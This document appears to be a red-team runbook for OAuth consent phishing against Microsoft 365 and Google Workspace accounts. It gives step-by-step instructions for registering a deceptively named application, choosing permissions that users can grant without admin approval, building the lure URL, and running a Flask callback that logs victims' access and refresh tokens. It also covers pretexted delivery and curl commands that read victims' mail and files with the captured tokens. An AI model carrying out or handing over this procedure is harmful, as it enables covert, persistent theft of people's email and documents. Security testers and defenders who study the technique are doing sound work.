# Runbook: OAuth consent phishing

OAuth consent phishing tricks a target into granting a malicious application persistent,
scoped access to their Microsoft 365 or Google Workspace account. No password is ever captured.
No MFA is bypassed. The target completes a legitimate authentication flow and grants permissions
through the identity provider's own consent screen. Access persists until the application is
explicitly revoked, surviving password resets and session expiry.

## Objective

Obtain a persistent OAuth access token granting read access to a target's email, files, or
directory data within Microsoft 365 or Google Workspace, without capturing credentials.

## Prerequisites

- An Azure AD (Microsoft Entra) tenant or a Google Cloud project to register the malicious
  application. Both can be created with a free account.
- A domain for the application's redirect URI and any supporting lure materials.
- A delivery mechanism for the lure link.
- Optionally, an application display name and logo that matches a plausible legitimate service.

## Application registration (Microsoft 365)

Create a free Azure account at portal.azure.com if you do not already have a tenant.

Navigate to: Azure Active Directory > App registrations > New registration.

Set:
- Name: something plausible. "IT Security Compliance Scanner" or "Document Approval Workflow"
  or the name of a real productivity tool the target organisation is likely to use.
- Supported account types: "Accounts in any organisational directory" allows the app to request
  consent from any M365 tenant, not just your own.
- Redirect URI: a URL on your infrastructure that will receive the authorisation code.

After registration, navigate to API permissions and add the delegated permissions you want the
application to request. Useful permissions:

| Permission     | What it provides                          |
|----------------|-------------------------------------------|
| Mail.Read      | Read all email in the mailbox             |
| Mail.Send      | Send email as the target                  |
| Files.Read.All | Read all OneDrive and SharePoint files    |
| Contacts.Read  | Read the full address book                |
| Calendars.Read | Read calendar entries and meeting details |
| User.Read      | Read the target's profile                 |

Permissions that require administrator consent are shown with a warning. Stick to delegated
user permissions if you are targeting individual users rather than administrators: these can be
granted by the user themselves without administrator involvement.

Note the Application (client) ID and Directory (tenant) ID from the overview page.

## Application registration (Google Workspace)

Navigate to console.cloud.google.com and create a project. Under APIs and Services, enable the
APIs corresponding to the scopes you want (Gmail API, Drive API, and so on).

Configure the OAuth consent screen: set the application name, add a support email, and set the
scopes. For a target outside your own Google Workspace tenant, set the application to External
and add the required scopes. The application will be in testing mode initially, which limits it
to manually added test users; publishing the application removes that restriction but triggers
a Google review for sensitive scopes.

For engagements: use restricted scopes (basic profile, email) to avoid the review process, or
use a Google Workspace tenant you control with domain-wide delegation configured.

## Constructing the authorisation URL

For Microsoft 365, the authorisation URL has the form:

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize
  ?client_id=<your application client ID>
  &response_type=code
  &redirect_uri=<your redirect URI, URL-encoded>
  &scope=<space-separated scopes, URL-encoded>
  &state=<random string for CSRF protection>
```

A working example with Mail.Read and Files.Read.All:

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=YOUR_CLIENT_ID&response_type=code&redirect_uri=https%3A%2F%2Fyourdomain.com%2Fcallback&scope=Mail.Read%20Files.Read.All%20User.Read&state=abc123
```

Test this URL in a browser against your own test account first. You should see the Microsoft
consent screen listing the permissions you configured. If you see an error, check the redirect
URI matches exactly what is registered in Azure (including trailing slashes).

## Redirect URI handler

When the target approves the consent screen, their browser is redirected to your redirect URI
with an authorisation code in the query string. You need to exchange this code for an access
token. A minimal Python handler using Flask:

```python
from flask import Flask, request
import requests

app = Flask(__name__)
CLIENT_ID = 'your-client-id'
CLIENT_SECRET = 'your-client-secret'
REDIRECT_URI = 'https://yourdomain.com/callback'

@app.route('/callback')
def callback():
    code = request.args.get('code')
    token_response = requests.post(
        'https://login.microsoftonline.com/common/oauth2/v2.0/token',
        data={
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI,
        }
    )
    tokens = token_response.json()
    # Log the access_token and refresh_token
    with open('tokens.log', 'a') as f:
        f.write(str(tokens) + '\n')
    # Redirect target to a plausible landing page
    return redirect('https://office.com')

if __name__ == '__main__':
    app.run(ssl_context='adhoc')
```

Store the refresh token: it can be used to obtain new access tokens without further interaction
from the target, for as long as the application remains authorised.

## Delivery

Deliver the authorisation URL to targets through email or any other channel. The URL points to
a legitimate Microsoft or Google domain, so it passes URL inspection. The email pretext should
match the application name: if the app is named "Document Approval Workflow," the email should
read like a notification from that workflow system.

Because the consent screen is served by Microsoft or Google rather than your infrastructure,
the target sees a legitimate identity provider page with a valid certificate and familiar
design. What they need to do is read the permissions list carefully, which, in practice, most
people do not do.

## Using the access token

With a valid access token, query the Microsoft Graph API or Google APIs directly:

```bash
# List target's recent emails
curl -H "Authorization: Bearer <access_token>" \
  https://graph.microsoft.com/v1.0/me/messages?$top=10

# List OneDrive files
curl -H "Authorization: Bearer <access_token>" \
  https://graph.microsoft.com/v1.0/me/drive/root/children

# Read a specific email
curl -H "Authorization: Bearer <access_token>" \
  https://graph.microsoft.com/v1.0/me/messages/<message_id>
```

Use the refresh token to obtain new access tokens as needed:

```bash
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -d "client_id=YOUR_CLIENT_ID&client_secret=YOUR_SECRET&grant_type=refresh_token&refresh_token=YOUR_REFRESH_TOKEN"
```

## Checking what was granted

After obtaining tokens, check the actual permissions granted (which may differ from what was
requested if the tenant has restricted certain scopes):

```bash
curl -H "Authorization: Bearer <access_token>" \
  https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants
```

## Evidence collection

- Screenshot of the consent screen showing the application name and permissions.
- The authorisation code exchange response showing the token and granted scopes.
- A screenshot of the API call and response demonstrating the access obtained.
- Log of the redirect callback with timestamp and source IP.

## Techniques

- [Consent phishing and OAuth abuse](../credentials/consent-phishing.md) — OAuth mechanism, application registration, and token persistence

## Resources

- [Microsoft: OAuth 2.0 authorisation code flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-auth-code-flow)
- [o365-attack-toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)
